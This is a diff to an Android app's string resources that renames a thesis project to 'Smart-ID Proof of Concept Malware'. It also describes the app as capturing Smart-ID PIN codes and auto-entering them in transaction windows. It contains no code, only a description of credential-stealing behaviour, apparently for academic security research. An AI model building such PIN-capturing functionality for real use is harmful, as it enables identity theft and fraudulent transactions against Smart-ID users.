@@ -1,6 +1,9 @@
 <resources>
-    <string name="app_name">Thesis</string>
+    <string name="app_name">Smart-ID Proof of Concept Malware</string>
 
-    <string name="introduction">This app extracts the Smart-ID PINs when the user enters it and auto sends it, if the option is enabled!</string>
-    <string name="warning">This is a proof of concept, and has bugs, not a fully working app!</string>
+    <string name="introduction">
+        This is a proof of concept application that captures Smart-ID PIN codes entered by the user
+        in the Smart-ID application and is capable of entering the captured PIN automatically in
+        the Smart-ID transaction window.
+    </string>
 </resources>
